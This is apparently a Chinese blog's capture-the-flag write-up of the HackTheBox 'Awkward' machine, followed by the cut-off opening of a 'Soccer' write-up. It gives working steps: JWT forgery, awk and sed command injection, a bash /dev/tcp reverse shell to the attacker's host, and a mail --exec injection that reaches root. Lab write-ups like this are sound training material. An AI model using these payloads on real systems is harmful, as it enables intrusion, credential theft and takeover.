token的secret值为123beany123，用JWT Debugger尝试，暂时没发现什么 SSRF想起刚才发现的另一个API，api/store-status?url=\"http://store.hat-valley.htb\"，可能存在SSRF 尝试http://127.0.0.1:80，被重定向到http://store.hat-valley.htb，证实存在SSRF http://hat-valley.htb/api/store-status?url=\"http://127.0.0.1:80\"--&gt;http://store.hat-valley.htb ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u 'http://hat-valley.htb/api/store-status?url=\"http://127.0.0.1:FUZZ\"' -fs 0 三个端口80、3002、8080 3002是API文件，记录了站点的API信息及其源码，API名称如下 Login (/api/login) Submit Leave (/api/submit-leave) All Leave (/api/all-leave) Store Status (/api/store-status) Staff Details (/api/staff-details) 8080页面空白，看源码发现hat-valley不能正常工作，要求开启JavaScript才能正常工作，没什么用 LFI在其中一个API源码发现漏洞点，在28行exec函数里，有用户可控的参数user，通过操纵参数user，执行awk命令读取文件（PS：题目名称Awkward原来体现在这）。而user值的获取，往前追溯代码，发现是通过decodedToken，然后取username字段得到的。 再往前追溯到头，发现是如下图所示的传递链，TOKEN_SECRET前面已经获得，值为123beany123，所以我们就可以通过JWT伪造请求头中Cookie字段的token值，从而操纵user值读取文件 app.get('/api/all-leave', (req, res) =&gt; { const user_token = req.cookies.token var authFailed = false var user = null if(user_token) { const decodedToken = jwt.verify(user_token, TOKEN_SECRET) if(!decodedToken.username) { authFailed = true } else { user = decodedToken.username } } if(authFailed) { return res.status(401).json({Error: \"Invalid Token\"}) } if(!user) { return res.status(500).send(\"Invalid user\") } const bad = [\";\",\"&amp;\",\"|\",\"&gt;\",\"&lt;\",\"*\",\"?\",\"`\",\"$\",\"(\",\")\",\"{\",\"}\",\"[\",\"]\",\"!\",\"#\"] const badInUser = bad.some(char =&gt; user.includes(char)); if(badInUser) { return res.status(500).send(\"Bad character detected.\") } exec(\"awk '/\" + user + \"/' /var/www/private/leave_requests.csv\", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) =&gt; { if(stdout) { return res.status(200).send(new Buffer(stdout, 'binary')); } if (error) { return res.status(500).send(\"Failed to retrieve leave requests\") } if (stderr) { return res.status(500).send(\"Failed to retrieve leave requests\") } }) }) 关键代码 ...... user = decodedToken.username ...... exec(\"awk '/\" + user + \"/' /var/www/private/leave_requests.csv\", {encoding: 'binary', maxBuffer: 51200000} ...... 比如我们让user=/' /etc/passwd '，那么得到的命令如下 awk '//' /etc/passwd '/' /var/www/private/leave_requests.csv 可以在自己本地测试 用JWT Debugger，先将获取到的token复制到Encoded文本框里，然后修改Decoded文本框中username值为/' /etc/passwd '，然后左侧Encoded文本框就会实时出现伪造后的token值 ┌──(root💀kali)-[~/Desktop] └─# curl http://hat-valley.htb/api/all-leave --header \"Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzc4MjAwNzN9.TyuC5rH79AtjGs4biOvMhtG0CHRm1HfLfrWqRhylrLk\" | grep -i /bin/bash % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 3059 100 3059 0 0 3216 0 --:--:-- --:--:-- --:--:-- 3213 root:x:0:0:root:/root:/bin/bash bean:x:1001:1001:,,,:/home/bean:/bin/bash christine:x:1002:1002:,,,:/home/christine:/bin/bash 发现2个用户，bean和christine 尝试修改payload如下，执行类似上述的命令 { \"username\": \"/' /home/bean/.ssh/id_rsa '\", \"iat\": 1677820073 } 报错Failed to retrieve leave requests 修改payload如下 { \"username\": \"/' /home/christine/.ssh/id_rsa '\", \"iat\": 1677820073 } 依然报错Failed to retrieve leave requests 修改如下 { \"username\": \"/' /home/bean/.bashrc '\", \"iat\": 1677820073 } 有东西了 ┌──(root💀kali)-[~/Desktop] └─# curl http://hat-valley.htb/api/all-leave --header \"Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc3ODIwMDczfQ.NJ1ArXnFPdqvtf4K9Exdo34a4r73JZNUlg6VANAW7sQ\" # ~/.bashrc: executed by bash(1) for non-login shells. # see /usr/share/doc/bash/examples/startup-files (in the package bash-doc) # for examples # If not running interactively, don't do anything case $- in *i*) ;; *) return;; esac # don't put duplicate lines or lines starting with space in the history. # See bash(1) for more options HISTCONTROL=ignoreboth # append to the history file, don't overwrite it shopt -s histappend # for setting history length see HISTSIZE and HISTFILESIZE in bash(1) HISTSIZE=1000 HISTFILESIZE=2000 # check the window size after each command and, if necessary, # update the values of LINES and COLUMNS. shopt -s checkwinsize # If set, the pattern \"**\" used in a pathname expansion context will # match all files and zero or more directories and subdirectories. #shopt -s globstar # make less more friendly for non-text input files, see lesspipe(1) [ -x /usr/bin/lesspipe ] &amp;&amp; eval \"$(SHELL=/bin/sh lesspipe)\" # set variable identifying the chroot you work in (used in the prompt below) if [ -z \"${debian_chroot:-}\" ] &amp;&amp; [ -r /etc/debian_chroot ]; then debian_chroot=$(cat /etc/debian_chroot) fi # set a fancy prompt (non-color, unless we know we \"want\" color) case \"$TERM\" in xterm-color|*-256color) color_prompt=yes;; esac # uncomment for a colored prompt, if the terminal has the capability; turned # off by default to not distract the user: the focus in a terminal window # should be on the output of commands, not on the prompt #force_color_prompt=yes if [ -n \"$force_color_prompt\" ]; then if [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; then # We have color support; assume it's compliant with Ecma-48 # (ISO/IEC-6429). (Lack of such support is extremely rare, and such # a case would tend to support setf rather than setaf.) color_prompt=yes else color_prompt= fi fi if [ \"$color_prompt\" = yes ]; then PS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ ' else PS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ ' fi unset color_prompt force_color_prompt # If this is an xterm set the title to user@host:dir case \"$TERM\" in xterm*|rxvt*) PS1=\"\\[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a\\]$PS1\" ;; *) ;; esac # enable color support of ls and also add handy aliases if [ -x /usr/bin/dircolors ]; then test -r ~/.dircolors &amp;&amp; eval \"$(dircolors -b ~/.dircolors)\" || eval \"$(dircolors -b)\" alias ls='ls --color=auto' #alias dir='dir --color=auto' #alias vdir='vdir --color=auto' alias grep='grep --color=auto' alias fgrep='fgrep --color=auto' alias egrep='egrep --color=auto' fi # colored GCC warnings and errors #export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01' # some more ls aliases alias ll='ls -alF' alias la='ls -A' alias l='ls -CF' # custom alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh' # Add an \"alert\" alias for long running commands. Use like so: # sleep 10; alert alias alert='notify-send --urgency=low -i \"$([ $? = 0 ] &amp;&amp; echo terminal || echo error)\" \"$(history|tail -n1|sed -e '\\''s/^\\s*[0-9]\\+\\s*//;s/[;&amp;|]\\s*alert$//'\\'')\"' # Alias definitions. # You may want to put all your additions into a separate file like # ~/.bash_aliases, instead of adding them here directly. # See /usr/share/doc/bash-doc/examples in the bash-doc package. if [ -f ~/.bash_aliases ]; then . ~/.bash_aliases fi # enable programmable completion features (you don't need to enable # this, if it's already enabled in /etc/bash.bashrc and /etc/profile # sources /etc/bash.bashrc). if ! shopt -oq posix; then if [ -f /usr/share/bash-completion/bash_completion ]; then . /usr/share/bash-completion/bash_completion elif [ -f /etc/bash_completion ]; then . /etc/bash_completion fi fi 大概在98行，看到有 alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh' 尝试用JWT去读/home/bean/Documents/backup_home.sh ┌──(root💀kali)-[~/Desktop] └─# curl http://hat-valley.htb/api/all-leave --header \"Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzc4MjAwNzN9.FeikFTrIWzIe5LAJnPRZGH_Z7B1RLpfKJ4saxf9T74s\" #!/bin/bash mkdir /home/bean/Documents/backup_tmp cd /home/bean tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz . date &gt; /home/bean/Documents/backup_tmp/time.txt cd /home/bean/Documents/backup_tmp tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz . rm -r /home/bean/Documents/backup_tmp 看到有/home/bean/Documents/backup/bean_backup_final.tar.gz 再用JWT去读，并且用curl把他输出到本地 ┌──(root💀kali)-[~/Desktop] └─# curl http://hat-valley.htb/api/all-leave --header \"Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY3NzgyMDA3M30.wArGs4nDtEexKppqgQ1gHSOrq1y91D486JBYTpN4f7E\" --output bean_backup_final.zip % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 31716 100 31716 0 0 20265 0 0:00:01 0:00:01 --:--:-- 20265 unzip不行，直接双击打开，把文件拖出来，依次得到如下图文件 解压bean_backup.tar.gz得到以下文件 ┌──(root💀kali)-[~/Desktop/bean_backup] └─# ls -la total 72 drwxr-x--- 15 1001 1001 4096 Sep 15 07:45 . drwxr-x--- 3 1001 1001 4096 Mar 3 04:19 .. lrwxrwxrwx 1 1001 1001 9 Sep 15 07:40 .bash_history -&gt; /dev/null -rw-r--r-- 1 1001 1001 220 Sep 15 07:34 .bash_logout -rw-r--r-- 1 1001 1001 3847 Sep 15 07:45 .bashrc drwx------ 12 1001 1001 4096 Sep 15 07:41 .config drwxr-xr-x 2 1001 1001 4096 Sep 15 07:35 Desktop drwxr-xr-x 4 1001 1001 4096 Sep 15 07:46 Documents drwxr-xr-x 2 1001 1001 4096 Sep 15 07:35 Downloads drwx------ 2 1001 1001 4096 Sep 15 07:36 .gnupg drwx------ 3 1001 1001 4096 Sep 15 07:35 .local drwxr-xr-x 2 1001 1001 4096 Sep 15 07:35 Music drwxr-xr-x 2 1001 1001 4096 Sep 15 07:35 Pictures -rw-r--r-- 1 1001 1001 807 Sep 15 07:34 .profile drwxr-xr-x 2 1001 1001 4096 Sep 15 07:35 Public drwx------ 3 1001 1001 4096 Sep 15 07:35 snap drwx------ 2 1001 1001 4096 Sep 15 07:36 .ssh drwxr-xr-x 2 1001 1001 4096 Sep 15 07:35 Templates drwxr-xr-x 2 1001 1001 4096 Sep 15 07:35 Videos 在.config/xpad/content-DS1ZS1文件里发现一对疑似用户名密码的东西，最后还有一句，MAKE SURE TO USE THIS EVERYWHERE，看来这个账户密码会不止一次用到，由此可见，若是在真实渗透，前期收集的资产可能后期还会用到，整理好资产！ bean.hill #连接ssh时发现用户名是bean 014mrbeanrules!#P SSH连上去 权限提升查看host文件 bean@awkward:~$ cat /etc/hosts 127.0.0.1 localhost hat-valley.htb store.hat-valley.htb 127.0.0.1 awkward # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 发现新子域名，添加进本地hosts文件，访问，发现要用户名密码 store.hat-valley.htb 网站是nginx服务器，nginx服务器的默认用户名密码通常在/etc/nginx/conf.d/.htaccess，那么我们尝试访问，但访问不到，发现有/etc/nginx/conf.d/.htpasswd bean@awkward:~$ cat /etc/nginx/conf.d/.htpasswd admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1 hash尝试各种爆破无果，想起之前的MAKE SURE TO USE THIS EVERYWHERE，尝试各种组合之后，发现用户名是admin，密码是bean用户的密码，成功登入 经查找，站点源码在/var/www/store目录下 bean@awkward:/var/www/store$ ls -la total 104 drwxr-xr-x 9 root root 4096 Oct 6 01:35 . drwxr-xr-x 7 root root 4096 Oct 6 01:35 .. drwxrwxrwx 2 root root 4096 Mar 3 21:30 cart -rwxr-xr-x 1 root root 3664 Sep 15 20:09 cart_actions.php -rwxr-xr-x 1 root root 12140 Sep 15 20:09 cart.php -rwxr-xr-x 1 root root 9143 Sep 15 20:09 checkout.php drwxr-xr-x 2 root root 4096 Oct 6 01:35 css drwxr-xr-x 2 root root 4096 Oct 6 01:35 fonts drwxr-xr-x 6 root root 4096 Oct 6 01:35 img -rwxr-xr-x 1 root root 14770 Sep 15 20:09 index.php drwxr-xr-x 3 root root 4096 Oct 6 01:35 js drwxrwxrwx 2 root root 4096 Mar 3 21:50 product-details -rwxr-xr-x 1 root root 918 Sep 15 20:09 README.md -rwxr-xr-x 1 root root 13731 Sep 15 20:09 shop.php drwxr-xr-x 6 root root 4096 Oct 6 01:35 static -rwxr-xr-x 1 root root 695 Sep 15 20:09 style.css 查看README.md 有几个信息 没有数据库，只有离线文件 /product-details存储产品信息 /cart存储用户的购物车信息，并且根据用户的session ID命名 bean@awkward:/var/www/store$ cat README.md # Hat Valley - Shop Online! ### To Do 1. Waiting for SQL database to be setup, using offline files for now, will merge with database once it is setup 2. Implement checkout system, link with credit card system (Stripe??) 3. Implement shop filter 4. Get full catalogue of items ### How to Add New Catalogue Item 1. Copy an existing item from /product-details and paste it in the same folder, changing the name to reflect a new product ID 2. Change the fields to the appropriate values and save the file. -- NOTE: Please leave the header on first line! This is used to verify it as a valid Hat Valley product. -- ### Hat Valley Cart Right now, the user's cart is stored within /cart, and is named according to the user's session ID. All products are appended to the same file for each user. To test cart functionality, create a new cart file and add items to it, and see how they are reflected on the store website! 查看cart_actions.php &lt;?php $STORE_HOME = \"/var/www/store/\"; //check for valid hat valley store item function checkValidItem($filename) { if(file_exists($filename)) { $first_line = file($filename)[0]; if(strpos($first_line, \"***Hat Valley\") !== FALSE) { return true; } } return false; } //add to cart if ($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; $_POST['action'] === 'add_item' &amp;&amp; $_POST['item'] &amp;&amp; $_POST['user']) { $item_id = $_POST['item']; $user_id = $_POST['user']; $bad_chars = array(\";\",\"&amp;\",\"|\",\"&gt;\",\"&lt;\",\"*\",\"?\",\"`\",\"$\",\"(\",\")\",\"{\",\"}\",\"[\",\"]\",\"!\",\"#\"); //no hacking allowed!! foreach($bad_chars as $bad) { if(strpos($item_id, $bad) !== FALSE) { echo \"Bad character detected!\"; exit; } } foreach($bad_chars as $bad) { if(strpos($user_id, $bad) !== FALSE) { echo \"Bad character detected!\"; exit; } } if(checkValidItem(\"{$STORE_HOME}product-details/{$item_id}.txt\")) { if(!file_exists(\"{$STORE_HOME}cart/{$user_id}\")) { system(\"echo '***Hat Valley Cart***' &gt; {$STORE_HOME}cart/{$user_id}\"); } system(\"head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 &gt;&gt; {$STORE_HOME}cart/{$user_id}\"); echo \"Item added successfully!\"; } else { echo \"Invalid item\"; } exit; } //delete from cart if ($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; $_POST['action'] === 'delete_item' &amp;&amp; $_POST['item'] &amp;&amp; $_POST['user']) { $item_id = $_POST['item']; $user_id = $_POST['user']; $bad_chars = array(\";\",\"&amp;\",\"|\",\"&gt;\",\"&lt;\",\"*\",\"?\",\"`\",\"$\",\"(\",\")\",\"{\",\"}\",\"[\",\"]\",\"!\",\"#\"); //no hacking allowed!! foreach($bad_chars as $bad) { if(strpos($item_id, $bad) !== FALSE) { echo \"Bad character detected!\"; exit; } } foreach($bad_chars as $bad) { if(strpos($user_id, $bad) !== FALSE) { echo \"Bad character detected!\"; exit; } } if(checkValidItem(\"{$STORE_HOME}cart/{$user_id}\")) { system(\"sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}\"); echo \"Item removed from cart\"; } else { echo \"Invalid item\"; } exit; } //fetch from cart if ($_SERVER['REQUEST_METHOD'] === 'GET' &amp;&amp; $_GET['action'] === 'fetch_items' &amp;&amp; $_GET['user']) { $html = \"\"; $dir = scandir(\"{$STORE_HOME}cart\"); $files = array_slice($dir, 2); foreach($files as $file) { $user_id = substr($file, -18); if($user_id === $_GET['user'] &amp;&amp; checkValidItem(\"{$STORE_HOME}cart/{$user_id}\")) { $product_file = fopen(\"{$STORE_HOME}cart/{$file}\", \"r\"); $details = array(); while (($line = fgets($product_file)) !== false) { if(str_replace(array(\"\\r\", \"\\n\"), '', $line) !== \"***Hat Valley Cart***\") { //don't include first line array_push($details, str_replace(array(\"\\r\", \"\\n\"), '', $line)); } } foreach($details as $cart_item) { $cart_items = explode(\"&amp;\", $cart_item); for($x = 0; $x &lt; count($cart_items); $x++) { $cart_items[$x] = explode(\"=\", $cart_items[$x]); //key and value as separate values in subarray } $html .= \"&lt;tr&gt;&lt;td&gt;{$cart_items[1][1]}&lt;/td&gt;&lt;td&gt;{$cart_items[2][1]}&lt;/td&gt;&lt;td&gt;{$cart_items[3][1]}&lt;/td&gt;&lt;td&gt;&lt;button data-id={$cart_items[0][1]} onclick=\\\"removeFromCart(this, localStorage.getItem('user'))\\\" class='remove-item'&gt;Remove&lt;/button&gt;&lt;/td&gt;&lt;/tr&gt;\"; } } } echo $html; exit; } ?&gt; RCE审计，其中在删除购物车信息的时候，会执行如下代码 system(\"sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}\"); 注： '/item_id={$item_id}/d' #删除item_id={$item_id}的行 -i {$STORE_HOME}cart/{$user_id} #表示要操作的目标文件 我们可以添加一个商品到购物车，分析一下过程。如下图点击ADD TO CART 然后到bean用户的ssh窗口查看/var/www/store/cart（由上面的README.md文件或者cart_actions.php可以分析出这个路径），可以看到文件名为959e-8a52-2e0-fc52，也就是$user_id的值，文件内容里item_id=1 bean@awkward:/var/www/store/cart$ ls 959e-8a52-2e0-fc52 bean@awkward:/var/www/store/cart$ cat 959e-8a52-2e0-fc52 ***Hat Valley Cart*** item_id=1&amp;item_name=Yellow Beanie&amp;item_brand=Good Doggo&amp;item_price=$39.90 代码中item_id=1会被代入sed命令执行，虽然有过滤，但是可以闭合绕过，这里就是可操作的地方。经过测试，对于同一个用户$user_id的值不会变，而且bean没有修改购物车文件的权限，但是可以先删除，然后重新写一个相同文件名的文件，如下 bean@awkward:/var/www/store$ rm -rf cart/959e-8a52-2e0-fc52 bean@awkward:/var/www/store$ nano cart/959e-8a52-2e0-fc52 bean@awkward:/var/www/store$ cat cart/959e-8a52-2e0-fc52 ***Hat Valley Cart*** item_id=1' -e \"1e /tmp/shell.sh\" /tmp/shell.sh '&amp;item_name=Yellow Beanie&amp;item_brand=Good Doggo&amp;item_price=$39.90 构造payload可参考：https://gtfobins.github.io/gtfobins/sed/ 我们构造的payload及最终代入sed命令的效果如下 item_id=1' -e \"1e /tmp/shell.sh\" /tmp/shell.sh ' sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id} sed -i '1' -e \"1e /tmp/shell.sh\" /tmp/shell.sh '' /var/www/store/cart/959e-8a52-2e0-fc52 注： -e&lt;script&gt;或--expression=&lt;script&gt;表示以选项中指定的script来处理输入的文本文件 没有vim，那就用nano在/tmp目录写入反弹shell文件shell.sh，并添加可执行权限 bean@awkward:/tmp$ nano shell.sh bean@awkward:/tmp$ cat shell.sh #!/bin/bash bash -i &gt;&amp; /dev/tcp/[本地IP]/[想要监听的PORT] 0&gt;&amp;1 bean@awkward:/tmp$ ls -l shell.sh -rw-rw-r-- 1 bean bean 55 Mar 4 12:29 shell.sh bean@awkward:/tmp$ chmod +x shell.sh bean@awkward:/tmp$ ls -l shell.sh -rwxrwxr-x 1 bean bean 55 Mar 4 12:29 shell.sh 开启nc监听 nc -nvlp 9001 打开Burpsuite，然后打开如下购物车界面，点击Remove的同时截获请求 修改请求数据如下 item=1'+-e+\"1e+/tmp/shell.sh\"+/tmp/shell.sh+'&amp;user=959e-8a52-2e0-fc52&amp;action=delete_item 拿到www-data用户权限 本地下一个pspy64，然后开启80服务监听，再然后到bean用户的ssh窗口用wget从本地下载pspy64 然后在www-data用户窗口执行pspy64，看到inotifywait工具在监听/var/www/private/leave_requests.csv 查看/var/www/private/leave_requests.csv内容如下，可看到是Leave Request Database 再看到有mail命令在发送邮件，推测是从Leave Request Database读取，然后发送。mail命令可以执行文件，参考：https://gtfobins.github.io/gtfobins/mail/ 我们可以写入反弹shell文件 执行如下命令，将执行反弹shell的命令写入leave_requests.csv www-data@awkward:~/private$ echo '\" --exec=\"\\!/tmp/shell.sh\"' &gt;&gt; leave_requests.csv &lt; '\" --exec=\"\\!/tmp/shell.sh\"' &gt;&gt; leave_requests.csv www-data@awkward:~/private$ 然后开启监听，稍等片刻就会拿到root权限 Over！ 总结 信息收集发现JWT和SSRF； SSRF发现站点API； 审计API源码，发现可伪造JWT执行awk命令实现LFI拿到bean用户ssh； 连上ssh找到购物车源码，nginx敏感文件泄露找到admin账户； 审计购物车源码，发现删除购物车功能可利用sed命令实现RCE； RCE反弹shell获取www-data用户权限； 执行pspy64发现mail命令及其目标文件leave_requests.csv； 利用mail命令和leave_requests.csv反弹shell获取root权限。 参考https://0xdedinfosec.vercel.app/blog/hackthebox-awkward-writeup#cracking-jwt-secret https://systemweakness.com/hack-the-box-htb-writeup-awkward-3542681d9795 https://gtfobins.github.io/#sed https://gtfobins.github.io/gtfobins/sed/ https://gtfobins.github.io/gtfobins/mail/","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Soccer","slug":"HTB1-Soccer","date":"2023-03-08T06:34:13.000Z","updated":"2023-08-31T07:54:59.471Z","comments":true,"path":"posts/d0709a37.html","link":"","permalink":"https://wa0er.github.io/posts/d0709a37.html","excerpt":"","text":"HTB-Soccer话不多说，nmap一把梭 nmap -sC -sV 10.10.11.194 ┌──(root💀kali)-[~/桌面] └─# nmap -sC -sV 10.10.11.194 Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-06 04:01 EST Nmap scan report for 10.10.11.194 Host is up (0.26s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA) | 256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA) |_ 256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://soccer.htb/ 9091/tcp open xmltec-xmlmail? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: | HTTP/1.1 400 Bad Request | Connection: close | GetRequest: | HTTP/1.1 404 Not Found | Content-Security-Policy: default-src 'none' | X-Content-Type-Options: nosniff | Content-Type: text/html; charset=utf-8 | Content-Length: 139 | Date: Mon, 06 Feb 2023 09:01:48 GMT | Connection: close | &lt;!DOCTYPE html&gt; | &lt;html lang=\"en\"&gt; | &lt;head&gt; | &lt;meta charset=\"utf-8\"&gt; | &lt;title&gt;Error&lt;/title&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;pre&gt;Cannot GET /&lt;/pre&gt; | &lt;/body&gt; | &lt;/html&gt; | HTTPOptions: | HTTP/1.1 404 Not Found | Content-Security-Policy: default-src 'none' | X-Content-Type-Options: nosniff | Content-Type: text/html; charset=utf-8 | Content-Length: 143 | Date: Mon, 06 Feb 2023 09:01:49 GMT | Connection: close | &lt;!DOCTYPE html&gt; | &lt;html lang=\"en\"&gt; | &lt;head&gt; | &lt;meta charset=\"utf-8\"&gt; | &lt;title&gt;Error&lt;/title&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt; | &lt;/body&gt; | &lt;/html&gt; | RTSPRequest: | HTTP/1.1 404 Not Found | Content-Security-Policy: default-src 'none' | X-Content-Type-Options: nosniff | Content-Type: text/html; charset=utf-8 | Content-Length: 143 | Date: Mon, 06 Feb 2023 09:01:50 GMT | Connection: close | &lt;!DOCTYPE html&gt; | &lt;html lang=\"en\"&gt; | &lt;head&gt; | &lt;meta charset=\"utf-8\"&gt; | &lt;title&gt;Error&lt;/title&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt; | &lt;/body&gt; |_ &lt;/html&gt; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9091-TCP:V=7.91%I=7%D=2/6%Time=63E0C1F6%P=x86_64-pc-linux-gnu%r(inf SF:ormix,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\ SF:n\\r\\n\")%r(drda,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x2 SF:0close\\r\\n\\r\\n\")%r(GetRequest,168,\"HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\n SF:Content-Security-Policy:\\x20default-src\\x20'none'\\r\\nX-Content-Type-Opt SF:ions:\\x20nosniff\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nCon SF:tent-Length:\\x20139\\r\\nDate:\\x20Mon,\\x2006\\x20Feb\\x202023\\x2009:01:48\\x SF:20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang= SF:\\\"en\\\"&gt;\\n&lt;head&gt;\\n&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\n&lt;title&gt;Error&lt;/title&gt;\\n&lt;/h SF:ead&gt;\\n&lt;body&gt;\\n&lt;pre&gt;Cannot\\x20GET\\x20/&lt;/pre&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n\")%r(HTT SF:POptions,16C,\"HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Security-Poli SF:cy:\\x20default-src\\x20'none'\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nC SF:ontent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20143\\r SF:\\nDate:\\x20Mon,\\x2006\\x20Feb\\x202023\\x2009:01:49\\x20GMT\\r\\nConnection:\\ SF:x20close\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\"en\\\"&gt;\\n&lt;head&gt;\\n&lt;met SF:a\\x20charset=\\\"utf-8\\\"&gt;\\n&lt;title&gt;Error&lt;/title&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n&lt;pre&gt;Ca SF:nnot\\x20OPTIONS\\x20/&lt;/pre&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n\")%r(RTSPRequest,16C,\"HTT SF:P/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Security-Policy:\\x20default-sr SF:c\\x20'none'\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nContent-Type:\\x20t SF:ext/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20143\\r\\nDate:\\x20Mon,\\x SF:2006\\x20Feb\\x202023\\x2009:01:50\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt; SF:!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\"en\\\"&gt;\\n&lt;head&gt;\\n&lt;meta\\x20charset=\\\"ut SF:f-8\\\"&gt;\\n&lt;title&gt;Error&lt;/title&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n&lt;pre&gt;Cannot\\x20OPTIONS\\x SF:20/&lt;/pre&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n\")%r(RPCCheck,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\ SF:x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(DNSVersionBindReqTCP,2F, SF:\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r SF:(DNSStatusRequestTCP,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnecti SF:on:\\x20close\\r\\n\\r\\n\")%r(Help,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\ SF:nConnection:\\x20close\\r\\n\\r\\n\")%r(SSLSessionReq,2F,\"HTTP/1\\.1\\x20400\\x2 SF:0Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 49.39 seconds 开放端口：22（SSH）、80（HTTP，ngnix服务器）、9091 80端口HTTP服务域名为soccer.htb，将域名解析条目添加到hosts文件 echo \"10.10.11.194 soccer.htb\" &gt;&gt; /etc/hosts 浏览器访问soccer.htb，常规思路观察页面、看源码，没东西 gobuster扫目录（PS：龟速dirb还是少用） ┌──(root💀kali)-[~/桌面] └─# gobuster dir -u http://soccer.htb/ -w /usr/share/wordlists/dirb/big.txt =============================================================== Gobuster v3.4 by OJ Reeves (@TheColonial) 